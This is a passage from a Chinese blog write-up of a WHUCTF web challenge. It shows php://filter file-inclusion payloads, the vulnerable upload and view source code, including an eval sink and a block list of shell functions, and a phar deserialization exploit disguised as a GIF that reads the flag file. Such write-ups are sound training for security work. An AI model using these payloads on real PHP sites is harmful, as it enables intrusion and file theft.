+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;acti0n&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;上传图片&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">class</span>=<span class="string">&#x27;btn&#x27;</span> <span class="attr">id</span>=<span class="string">&#x27;b1&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/TIM截图20200525150415.png" style="zoom:67%;">
+
+<p>自动进行302跳转</p>
+<p>这里存在文件包含的,构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?acti0n=php:<span class="comment">//filter/convert.bAse64-encode/resource=upload.php</span></span><br><span class="line">?acti0n=php:<span class="comment">//filter/string.rot13/resource=upload.php</span></span><br></pre></td></tr></table></figure>
+
+<p>读到源码upload.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dir = <span class="string">&#x27;upload/&#x27;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!mkdir($dir, <span class="number">0777</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> error_get_last()[<span class="string">&#x27;message&#x27;</span>];</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Failed to make the directory&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">chdir($dir);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    $name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $ans = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;filesize too big.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;filename can not be empty!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(htaccess)|(user)|(\.\.)|(%)|(#)/i&#x27;</span>, $name) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span><br><span class="line">        $type = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($type == <span class="string">&#x27;image/gif&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/jpg&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/png&#x27;</span> <span class="keyword">or</span> $type == <span class="string">&#x27;image/jpeg&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $content = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;You could not upload this image because of some dangerous code in your file!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;       </span><br><span class="line"></span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;</span>, $extension) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    $upload_file = $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_exists($name)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;Your file <span class="subst">$name</span> has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传失败&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot;&gt;&lt;a href=\&quot;view.php\&quot; &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">#header(&quot;refresh:3;url=index.php&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>view.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#include_once &quot;flag.php&quot;; </span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $dir;</span><br><span class="line">    <span class="keyword">private</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dir = <span class="string">&#x27;upload/&#x27;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&#x27;echo &quot;&lt;div style=\&quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\&quot;&gt;Powered by: xxx&lt;/div&gt;&quot;;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;dir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = scandir(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;get_file_list();</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt; sizeof($file); $i++) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;[&quot;</span>.strval($i - <span class="number">1</span>).<span class="string">&quot;]  <span class="subst">$file</span>[<span class="subst">$i</span>] &lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_img</span>(<span class="params">$file_name</span>) </span>&#123;</span><br><span class="line">        $name = $file_name;</span><br><span class="line">        $width = getimagesize($name)[<span class="number">0</span>];</span><br><span class="line">        $height = getimagesize($name)[<span class="number">1</span>];</span><br><span class="line">        $times = $width / <span class="number">200</span>;</span><br><span class="line">        $width /= $times;</span><br><span class="line">        $height /= $times;</span><br><span class="line">        $template = <span class="string">&quot;&lt;img style=\&quot;clear: both;display: block;margin: auto;\&quot; src=\&quot;<span class="subst">$this</span>-&gt;dir<span class="subst">$name</span>\&quot; alt=\&quot;<span class="subst">$file_name</span>\&quot; width = \&quot;<span class="subst">$width</span>\&quot; height = \&quot;<span class="subst">$height</span>\&quot;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">delete_img</span>(<span class="params">$file_name</span>) </span>&#123;</span><br><span class="line">        $name = $file_name;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($name)) &#123;</span><br><span class="line">            @unlink($name);</span><br><span class="line">            <span class="keyword">if</span>(!file_exists($name)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;成功删除! 3s后跳转&lt;/p&gt;&quot;</span>;</span><br><span class="line">                header(<span class="string">&quot;refresh:3;url=view.php&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Can not delete!&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;找不到这个文件! &lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ins = <span class="keyword">new</span> View();</span><br><span class="line">chdir($ins-&gt;dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;当前目录为 &quot;</span> . $ins-&gt;dir . <span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line">$ins-&gt;show_file_list();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;show&#x27;</span>])) &#123;</span><br><span class="line">    $file_name = $_POST[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line">    $ins-&gt;show_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line">    $file_name = $_POST[<span class="string">&#x27;delete&#x27;</span>];</span><br><span class="line">    $ins-&gt;delete_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($ins);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不用phar反序列化也能getflag，没过滤assert直接传个马包含</p>
+<p>再看看phar反序列化怎末搞得吧，phar反序列化影响的函数：</p>
+<img src="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png" style="zoom:80%;">
+
+<p>在delete_img函数里我们看到了file_exists函数，由此，思路很明确，上传phar文件，然后删除文件就能触发反序列化了，构造exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $dir;</span><br><span class="line">    <span class="keyword">private</span> $cmd=<span class="string">&quot;echo &#x27;ok&#x27;;readfile(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> View;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;s.phar&quot;</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后上传phar文件，改下后缀为gif,需要用绝对路径，查看源码得到flag</p>
+<img src="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/TIM截图20200525155136.png" style="zoom:80%;">
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/>http://www.moonback.xyz/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-06-02T16:18:18+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年6月2日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/&title=WHUCTF web wp - 明月归的小站&summary=武汉大学萌新赛的题目，做做吧！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/&title=WHUCTF web wp - 明月归的小站&summary=武汉大学萌新赛的题目，做做吧！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/&title=WHUCTF web wp - 明月归的小站&summary=武汉大学萌新赛的题目，做做吧！"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/05/24/%E6%AF%94%E8%B5%9B/2020/GKCTF2020-writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>GKCTF2020 writeup</p>
+                <p class='content'>由防灾科技学院&amp;Bugfor举办的比赛，记一下！
+
+
+webCheckINbase64加密一下，先往/tmp下写个马，然后包含这个马，蚁剑连上LD_PRELOAD bypass disa...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/05/22/%E6%AF%94%E8%B5%9B/2020/DASCTF2020-wp/'>
+                <p class='title'>DASCTF2020 wp<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>BJDCTF第三届和DASCTF联合举办的比赛！
+
+
+web帮帮小红花这题刚开始有非预期，直接写文件就行
+改过之后可以时间盲注爆flag，exp:
+12345678910111213141516...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-sqli"><span class="toc-text">Easy_sqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp"><span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezcmd"><span class="toc-text">ezcmd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezinclude"><span class="toc-text">ezinclude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-unserialize"><span class="toc-text">Easy_unserialize</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
